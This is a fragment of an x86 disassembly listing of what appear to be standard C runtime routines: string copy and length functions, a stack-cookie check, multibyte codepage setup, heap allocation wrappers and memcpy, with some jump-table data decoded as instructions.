  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
